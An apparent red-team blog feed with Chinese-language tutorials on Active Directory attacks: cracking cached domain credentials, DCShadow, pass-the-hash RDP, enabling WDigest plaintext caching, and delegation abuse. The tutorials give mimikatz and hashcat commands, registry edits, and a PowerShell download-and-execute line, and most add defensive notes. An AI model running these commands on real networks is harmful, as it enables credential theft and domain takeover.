<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/laps/2.png" alt=""></p>
<h3 id="防御措施">防御措施</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 尽管LAPS有效防御了PTH攻击，但由于ms-mcs-AdmPwd字段在LDAP中是以明文存储的，在攻击者拿到整个域权限后可以枚举所有的密码，所以LAP也需要在一个短的周期内更改密码。
</span></span><span class="line"><span class="cl">2. 对域内进行加固。
</span></span></code></pre></div><h3 id="ad-check">AD CHECK</h3>
<p>可以检查 CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=redteam,DC=local是否存在CN=ms-Mcs-AdmPwd字段来判断是否部署LAPS。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/laps/3.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>MSCASH</title>
            <link>https://lzzbb.github.io/posts/2021/09/mscash/</link>
            <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/09/mscash/</guid>
            <description>MSCACHE的原理 Macash（又叫domain cached credentials、DCC、域缓存凭据）在PC连接域控失败的时候（比如员工晚上将电脑带回家）会自动使用缓存凭据来进行登录，这相当于是除了SAM、NDTS，以外的第三个数据库。
mscash hash 不是NTLM hash，无法用于PTH。
系统默认保存 10 个凭据（可以更改），当被保存的凭据已经超过 10 个的话，新的凭据会覆盖掉老的凭据；凭据被缓存在注册表里。
MSCASH的保存位置默认只有 SYSTEM 权限可读，位于HKEY_LOCAL_MACHINE\SECURITY\Cache（本地账户没有这个注册表项）
使用本地用户打开这个注册表项都为空
利用mimikatz离线破解 token::elevate #假冒令牌提升至system权限 lsadump::cache 下图是在一台域机器上用本地管理员用户进行登录，抓取到了域内administrator和marry的cache
而不在域内机器是不能进行读取的
以administrator为例：
使用hashcat来进行离线破解,真正密码为Qq123456..
‘$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589’ hashcat -m2100 &amp;#39;$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589&amp;#39; top10000.txt --force --potfile-disable 破解了域管administrator的明文密码，所以如果在横向没有头绪的时候，不要忘记了这个方法，可能会有意想不到的收获。
禁用凭证缓存 在组策略中设置禁用缓存
计算机配置—windows设置—安全设置—本地策略—安全选项 交互式登录：之前登录到缓存的次数（域控制器不可用时） 默认是10，设置为0</description>
            <content type="html"><![CDATA[<h3 id="mscache的原理">MSCACHE的原理</h3>
<p>Macash（又叫domain cached credentials、DCC、域缓存凭据）在PC连接域控失败的时候（比如员工晚上将电脑带回家）会自动使用缓存凭据来进行登录，这相当于是除了SAM、NDTS，以外的第三个数据库。</p>
<p><code>mscash hash 不是NTLM hash，无法用于PTH。</code></p>
<p>系统默认保存 10 个凭据（可以更改），当被保存的凭据已经超过 10 个的话，新的凭据会覆盖掉老的凭据；凭据被缓存在注册表里。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/1.png" alt=""></p>
<p>MSCASH的保存位置默认只有 SYSTEM 权限可读，位于HKEY_LOCAL_MACHINE\SECURITY\Cache（本地账户没有这个注册表项）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/2.jpg" alt=""></p>
<p>使用本地用户打开这个注册表项都为空</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/3.jpg" alt=""></p>
<h3 id="利用mimikatz离线破解">利用mimikatz离线破解</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">token::elevate    #假冒令牌提升至system权限
</span></span><span class="line"><span class="cl">lsadump::cache
</span></span></code></pre></div><p>下图是在一台域机器上用本地管理员用户进行登录，抓取到了域内administrator和marry的cache</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/4.jpg" alt=""></p>
<p>而不在域内机器是不能进行读取的</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/5.jpg" alt=""></p>
<p>以administrator为例：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/6.jpg" alt=""></p>
<p>使用hashcat来进行离线破解,真正密码为Qq123456..</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/7.jpg" alt=""></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">‘$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589’
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">hashcat  -m2100 &#39;$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589&#39;  top10000.txt  --force --potfile-disable
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/9.jpg" alt=""></p>
<p>破解了域管administrator的明文密码，所以如果在横向没有头绪的时候，不要忘记了这个方法，可能会有意想不到的收获。</p>
<h2 id="禁用凭证缓存">禁用凭证缓存</h2>
<p>在组策略中设置禁用缓存</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MSCASH/10.png" alt=""></p>
<p>计算机配置—windows设置—安全设置—本地策略—安全选项 交互式登录：之前登录到缓存的次数（域控制器不可用时） 默认是10，设置为0</p>
]]></content>
        </item>
        
        <item>
            <title>DCShadow</title>
            <link>https://lzzbb.github.io/posts/2021/08/dcshadow/</link>
            <pubDate>Sat, 14 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/08/dcshadow/</guid>
            <description>DCShadow简介 DCShadow是指攻击者获取到域控管理员权限后，将攻陷的主机伪装成为DC(域控制器)，在伪装的DC上修改数据，然后触发域数据同步，使得指定的新对象或修改后的属性能够同步进入其他的DC中，从而达到权限维持的目的。
nTDSDSA对象 在Windows域环境中，域控制器与普通主机的区别体现在活动目录数据库中，在活动目录数据库中通过一些特殊对象以及一定的数据对象层级关系来标识某台机器是域控制器。其中最关键的是nTDSDSA对象，该对象正是标识一台主机是域控角色的特殊对象，其位于活动目录数据库的configuration NC中
伪装域控 在Windows域环境中，域控和普通主机的区别体现在活动目录数据库中。AD数据库中使用nTDSDSA对象来表示域控制器，该对象始终位于活动目录数据库的配置（configuration NC）中，每个DC都存储在站点容器内,是server对象的子节点，其完整的DN为“CN=NTDS Settings,CN=ServerName,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=redteam,DC=lab”。因此，只要在schema的Configuration区中创建一个新的server及nTDSDSA对象，KCC就会将目标主机识别为DC。
通过DCShadow修改任意用户属性 通过查看权限后发现，SYSTEM、Domain Admins、Enterprise Admins、Administrators 可以在Configuration区中创建nTDSDSA对象。
获得当前机器的SYSTEM权限（这个令牌就具备了伪造域控的所需权限）
执行数据更改与监听
lsadump::dcshadow /object:marry /attribute:description /value:”carn” /object：更改信息的账号 /attribute：要更改的属性 /value：更改属性的值 以域管权限新打开一个mimikatz窗口（可以psexec远程调用），执行push，触发域控间数据同步过程
mimikatz # lsadump::dcshadow /push
marry的属性发生改变
既然活动目录能通过DCShadow进行修改，在实际攻击场景中，可以修改primarygroupid，SidHistory，委派等属性进行利用。
变更用户的所属组 lsadump::dcshadow /object:marry /attribute:primarygroupid /value:512
其中：512为Domain Admins所属组，在根域中，519为Enterprise Admins所属组（子域中没有EA组）
marry变为Domain Admins组内用户
可以通过4929事件记录所有详细的目录服务复制
前提需要开启本地安全策略中的审核目录服务访问（默认是关闭状态）
防御 DCShadow不是漏洞而是滥用了目录中的同步服务。
1.记录目录服务访问事件（EventID=4929)，监控所有发生4929事件来识别伪装的域控。
2.增强对域管的管理，防止其凭证泄漏。</description>
            <content type="html"><![CDATA[<h2 id="dcshadow简介">DCShadow简介</h2>
<p>DCShadow是指攻击者获取到域控管理员权限后，将攻陷的主机伪装成为DC(域控制器)，在伪装的DC上修改数据，然后触发域数据同步，使得指定的新对象或修改后的属性能够同步进入其他的DC中，从而达到权限维持的目的。</p>
<h3 id="ntdsdsa对象">nTDSDSA对象</h3>
<p>在Windows域环境中，域控制器与普通主机的区别体现在活动目录数据库中，在活动目录数据库中通过一些特殊对象以及一定的数据对象层级关系来标识某台机器是域控制器。其中最关键的是nTDSDSA对象，该对象正是标识一台主机是域控角色的特殊对象，其位于活动目录数据库的configuration NC中</p>
<h3 id="伪装域控">伪装域控</h3>
<p>在Windows域环境中，域控和普通主机的区别体现在活动目录数据库中。AD数据库中使用nTDSDSA对象来表示域控制器，该对象始终位于活动目录数据库的配置（configuration NC）中，每个DC都存储在站点容器内,是server对象的子节点，其完整的DN为“CN=NTDS Settings,CN=ServerName,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=redteam,DC=lab”。因此，只要在schema的Configuration区中创建一个新的server及nTDSDSA对象，KCC就会将目标主机识别为DC。</p>
<h3 id="通过dcshadow修改任意用户属性">通过DCShadow修改任意用户属性</h3>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/1.png" alt=""></p>
<p>通过查看权限后发现，SYSTEM、Domain Admins、Enterprise Admins、Administrators 可以在Configuration区中创建nTDSDSA对象。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/2.png" alt=""></p>
<p>获得当前机器的SYSTEM权限（这个令牌就具备了伪造域控的所需权限）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/3.png" alt=""></p>
<p>执行数据更改与监听</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">lsadump::dcshadow /object:marry /attribute:description /value:”carn”
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/object：更改信息的账号
</span></span><span class="line"><span class="cl">/attribute：要更改的属性
</span></span><span class="line"><span class="cl">/value：更改属性的值
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/4.png" alt=""></p>
<p>以域管权限新打开一个mimikatz窗口（可以psexec远程调用），执行push，触发域控间数据同步过程</p>
<p><code>mimikatz #  lsadump::dcshadow /push</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/5.png" alt=""></p>
<p>marry的属性发生改变</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/6.png" alt=""></p>
<p>既然活动目录能通过DCShadow进行修改，在实际攻击场景中，可以修改primarygroupid，SidHistory，委派等属性进行利用。</p>
<h3 id="变更用户的所属组">变更用户的所属组</h3>
<p><code>lsadump::dcshadow /object:marry /attribute:primarygroupid /value:512</code></p>
<p>其中：512为Domain Admins所属组，在根域中，519为Enterprise Admins所属组（子域中没有EA组）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/7.png" alt=""></p>
<p>marry变为Domain Admins组内用户</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/8.png" alt=""></p>
<p>可以通过4929事件记录所有详细的目录服务复制</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/9.png" alt=""></p>
<p>前提需要开启本地安全策略中的审核目录服务访问（默认是关闭状态）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/Dcshadow/10.png" alt=""></p>
<h2 id="防御">防御</h2>
<p><strong>DCShadow不是漏洞而是滥用了目录中的同步服务。</strong></p>
<p>1.记录目录服务访问事件（EventID=4929)，监控所有发生4929事件来识别伪装的域控。</p>
<p>2.增强对域管的管理，防止其凭证泄漏。</p>
]]></content>
        </item>
        
        <item>
            <title>hash登陆RDP</title>
            <link>https://lzzbb.github.io/posts/2021/06/hash%E7%99%BB%E9%99%86rdp/</link>
            <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/06/hash%E7%99%BB%E9%99%86rdp/</guid>
            <description>注入的哈希用户需要是目标机器的本地管理员
 场景 假设抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份RDP登录主机。
Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持Restricted Admin mode。也就是使用当前账户的hash凭据来登录远程桌面，无需输入明文密码。
条件： 1. Win10、server12及以上才可以利用，Win7和Server08默认不支持，需要安装2871997、2973351补丁。 2. 如果用户只在Remote Desktop Users组中是无法连接成功的，因为该机制就是针对受限的管理员模式。 复现 在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：
sekurlsa::pth /user:administrator /domain:192.168.16.62 /ntlm:06d8a9bafc009e178100087bb4e31ada “/run:mstsc.exe /restrictedadmin”
如果目标机器没有开启Restricted Admin mode可以执行如下命令开启：
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
查看是否已开启 DisableRestrictedAdmin
REG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin”
如果返回 REG_DWORD 0x0 就是开启
遇到CredSSP加密数据库错误是大概是因为win10家庭版，一条命令直接解决。
REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
防御措施 组策略 — 计算机配置 — 管理模板 — 系统 — 凭据分配 — 限制向远程服务器分配凭据，选择已启用</description>
            <content type="html"><![CDATA[<blockquote>
<p>注入的哈希用户需要是目标机器的本地管理员</p>
</blockquote>
<h2 id="场景">场景</h2>
<p>假设抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份RDP登录主机。</p>
<p>Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持Restricted Admin mode。也就是使用当前账户的hash凭据来登录远程桌面，无需输入明文密码。</p>
<h3 id="条件">条件：</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. Win10、server12及以上才可以利用，Win7和Server08默认不支持，需要安装2871997、2973351补丁。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2. 如果用户只在Remote Desktop Users组中是无法连接成功的，因为该机制就是针对受限的管理员模式。
</span></span></code></pre></div><h3 id="复现">复现</h3>
<p>在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：</p>
<p><code>sekurlsa::pth /user:administrator /domain:192.168.16.62 /ntlm:06d8a9bafc009e178100087bb4e31ada “/run:mstsc.exe /restrictedadmin”</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/hash-rdp/1.jpg" alt=""></p>
<p>如果目标机器没有开启Restricted Admin mode可以执行如下命令开启：</p>
<p><code>REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</code></p>
<p>查看是否已开启 DisableRestrictedAdmin</p>
<p><code>REG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin”</code></p>
<p>如果返回 REG_DWORD 0x0 就是开启</p>
<p>遇到CredSSP加密数据库错误是大概是因为win10家庭版，一条命令直接解决。</p>
<p><code>REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f</code></p>
<h3 id="防御措施">防御措施</h3>
<p>组策略 — 计算机配置 — 管理模板 — 系统 — 凭据分配 — 限制向远程服务器分配凭据，选择已启用</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/hash-rdp/2.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>wdigest</title>
            <link>https://lzzbb.github.io/posts/2021/06/wdigest/</link>
            <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/06/wdigest/</guid>
            <description>wdigest概述 windows可以看作是一个SSO，WDigest.dll从Windows XP引入，目的是为了把明文密码存在lsass里进行重复认证，从而减少用户输入密码的次数。并且无论是否使用它，都会将其存储在内存中。
老版本的系统打了补丁KB2871997，可以修改注册表禁用WDigest协议。
原理 在Windows Server2012及其以后的版本中，系统默认禁用Wdigest Auth，lsass进程不再保存明文口令。Mimikatz也就读不到密码明文，这是微软为了防止内存中泄露明文密码做的一个安全措施。
但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的（开启后，需要用户重新登录/锁屏重新输入密码生效）。
修改注册表，然后使用cmd锁屏/重启让用户重新登陆使mimikatz可以读取明文密码。
 开启wdigest Auth读取明文密码 启用或者禁用WDigest修改注册表位置:
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
UseLogonCredential值设置为0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文； UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。 cmd:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
powershell:
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
meterpreter
reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon
强制锁屏让用户输入密码/重启 ====cmd==== rundll32 user32.dll,LockWorkStation ====Powershell==== Function Lock-WorkStation { $signature = @&amp;#34; [DllImport(&amp;#34;user32.dll&amp;#34;, SetLastError = true)] public static extern bool LockWorkStation(); &amp;#34;@ $LockWorkStation = Add-Type -memberDefinition $signature -name &amp;#34;Win32LockWorkStation&amp;#34; -namespace Win32Functions -passthru $LockWorkStation::LockWorkStation() | Out-Null } Lock-WorkStation powershell -c “IEX (New-Object Net.</description>
            <content type="html"><![CDATA[<h2 id="wdigest概述">wdigest概述</h2>
<p>windows可以看作是一个SSO，WDigest.dll从Windows XP引入，目的是为了把明文密码存在lsass里进行重复认证，从而减少用户输入密码的次数。并且无论是否使用它，都会将其存储在内存中。</p>
<p><strong>老版本的系统打了补丁KB2871997，可以修改注册表禁用WDigest协议。</strong></p>
<h3 id="原理">原理</h3>
<p><strong>在Windows Server2012及其以后的版本中，系统默认禁用Wdigest Auth，lsass进程不再保存明文口令。Mimikatz也就读不到密码明文，这是微软为了防止内存中泄露明文密码做的一个安全措施。</strong></p>
<p><code>但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的（开启后，需要用户重新登录/锁屏重新输入密码生效）。</code></p>
<p><code>修改注册表，然后使用cmd锁屏/重启让用户重新登陆使mimikatz可以读取明文密码。</code></p>
<hr>
<h3 id="开启wdigest-auth读取明文密码">开启wdigest Auth读取明文密码</h3>
<p>启用或者禁用WDigest修改注册表位置:</p>
<p><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">UseLogonCredential值设置为0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文；
</span></span><span class="line"><span class="cl">UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。
</span></span></code></pre></div><p>cmd:</p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
<p>powershell:</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></p>
<p>meterpreter</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon</code></p>
<h3 id="强制锁屏让用户输入密码重启">强制锁屏让用户输入密码/重启</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">====cmd====
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">rundll32 user32.dll,LockWorkStation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">====Powershell====
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Function Lock-WorkStation
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">$signature = @&#34;
</span></span><span class="line"><span class="cl">[DllImport(&#34;user32.dll&#34;, SetLastError = true)]
</span></span><span class="line"><span class="cl">public static extern bool LockWorkStation();
</span></span><span class="line"><span class="cl">&#34;@
</span></span><span class="line"><span class="cl">$LockWorkStation = Add-Type -memberDefinition $signature -name &#34;Win32LockWorkStation&#34; -namespace Win32Functions -passthru
</span></span><span class="line"><span class="cl">$LockWorkStation::LockWorkStation() | Out-Null
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">Lock-WorkStation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">powershell -c “IEX (New-Object Net.WebClient).DownloadString(‘https://x.x.x.x/Lock-WorkStation.ps1’);”
</span></span></code></pre></div><h3 id="读取内存明文">读取内存明文</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mimikatz.exe log privilege::Debug sekurlsa::logonpasswords exit
</span></span><span class="line"><span class="cl">type mimikatz.log | find /I “password”
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/wdigest/1.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/wdigest/2.jpg" alt=""></p>
<h2 id="wdigest-禁用缓存">WDigest 禁用缓存</h2>
<p>WDigest默认在win2008之前是默认启用的。但是在win2008之后的系统默认是关闭的。如果在win2008之前的系统上打了KB2871997补丁，那么就可以去启用或者禁用WDigest。</p>
<p>在注册表中将UseLogonCredential值设置为0，或者使用命令:</p>
<pre tabindex="0"><code>reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
</code></pre>]]></content>
        </item>
        
        <item>
            <title>委派利用面</title>
            <link>https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/</link>
            <pubDate>Fri, 23 Apr 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/</guid>
            <description>委派概述： 域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。
简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。
委派的方式： 非约束委派和约束委派，基于资源的约束委派。
在域内只有主机账号和服务账号才有委派属性
主机账号：活动目录中的computers组内的计算机，也被称为机器账号。
服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。
委派的前提： 被委派的用户不能被设置为不能被委派属性。
查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）： 1.利用powersploit中的powerview Import-Module .\PowerView.ps1;
查询非约束委派的主机 Get-NetComputer -Unconstrained -Domain hiro.com
查询非约束委派的服务账号 Get-NetUser -Unconstrained -Domain hiro.com | select name
2.利用ADFind 查找域中配置非约束委派的用户 AdFind.exe -b &amp;ldquo;DC=hiro,DC=com&amp;rdquo; -f &amp;ldquo;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;rdquo; cn distinguishedName
查找域中配置非约束委派的主机 AdFind.exe -b &amp;ldquo;DC=hiro,DC=com&amp;rdquo; -f &amp;ldquo;(&amp;amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;rdquo; cn distinguishedName
查找约束委派的主机或服务账号： 1.利用empire中的powerview Import-Module .\powerview.ps1;
查询约束委派的主机： Get-DomainComputer -TrustedToAuth -Domain hiro.com | select name
查询约束委派的账号： Get-DomainUser -TrustedToAuth -Domain hiro.com | select name
2.利用ADFind 查找域中配置约束委派用户: AdFind.exe -b &amp;ldquo;DC=hiro,DC=com&amp;rdquo; -f &amp;ldquo;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;rdquo; cn distinguishedName msds-allowedtodelegateto</description>
            <content type="html"><![CDATA[<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<h1 id="委派概述">委派概述：</h1>
<p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
<p><strong>简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</strong></p>
<h2 id="委派的方式">委派的方式：</h2>
<p><strong>非约束委派和约束委派，基于资源的约束委派。</strong></p>
<p><strong>在域内只有主机账号和服务账号才有委派属性</strong></p>
<p>主机账号：活动目录中的computers组内的计算机，也被称为机器账号。</p>
<p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p>
<h2 id="委派的前提">委派的前提：</h2>
<p>被委派的用户不能被设置为不能被委派属性。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/1.png" alt="image"></p>
<h2 id="查找非约束委派的主机或服务账号域控默认配置非约束委派属性">查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）：</h2>
<h3 id="1利用powersploit中的powerview">1.利用powersploit中的powerview</h3>
<p>Import-Module .\PowerView.ps1;</p>
<p>查询非约束委派的主机
Get-NetComputer -Unconstrained -Domain hiro.com</p>
<p>查询非约束委派的服务账号
Get-NetUser -Unconstrained -Domain hiro.com | select name</p>
<h3 id="2利用adfind">2.利用ADFind</h3>
<p>查找域中配置非约束委派的用户
AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&rdquo; cn distinguishedName</p>
<p>查找域中配置非约束委派的主机
AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&rdquo; cn distinguishedName</p>
<h2 id="查找约束委派的主机或服务账号">查找约束委派的主机或服务账号：</h2>
<h3 id="1利用empire中的powerview">1.利用empire中的powerview</h3>
<p>Import-Module .\powerview.ps1;</p>
<p>查询约束委派的主机：
Get-DomainComputer -TrustedToAuth -Domain hiro.com | select name</p>
<p>查询约束委派的账号：
Get-DomainUser -TrustedToAuth -Domain hiro.com | select name</p>
<h3 id="2利用adfind-1">2.利用ADFind</h3>
<p>查找域中配置约束委派用户:
AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&rdquo; cn distinguishedName msds-allowedtodelegateto</p>
<p>查找域中配置约束委派的主机：
AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&rdquo; cn distinguishedName msds-allowedtodelegateto</p>
<hr>
<h2 id="非约束委派">非约束委派</h2>
<h3 id="大致流程"><strong>大致流程：</strong></h3>
<p>user访问serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，如果是非约束委派的话，会把用户的<strong>TGT放在ST票据中并一起发送给serverA</strong>
这样serverA在验证ST票据的同时也获取到了用户的TGT，并<strong>把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来模拟这个user访问任何服务。</strong>
<img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/2.png" alt="image"></p>
<p>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境。</p>
<h3 id="利用">利用：</h3>
<pre tabindex="0"><code>域：hiro.com
域控：WIN-KONG IP：192.168.228.10  域管：administrator
受委派机器：WIN-E6FR4HVBPCI
</code></pre><p>现在将WIN-E6FR4HVBPCI这个机器账号设置为非约束委派。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/3.png" alt="image"></p>
<p>通过命令行打开adsiedit.msc查看WIN-E6FR4HVBPCI机器属性，可以看到：</p>
<p>当被设置为非约束委派的时候，它的userAccountControl会包含TRUSTED_FOR_DELEGATION字段。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/4.png" alt="image"></p>
<p>用域管访问WIN-E6FR4HVBPCI机器</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/5.png" alt="image"></p>
<p>然后在WIN-E6FR4HVBPCI上以管理员权限运行mimikatz</p>
<p><code>privilege::debug</code></p>
<p>导出票据</p>
<p><code>sekurlsa::tickets /export</code></p>
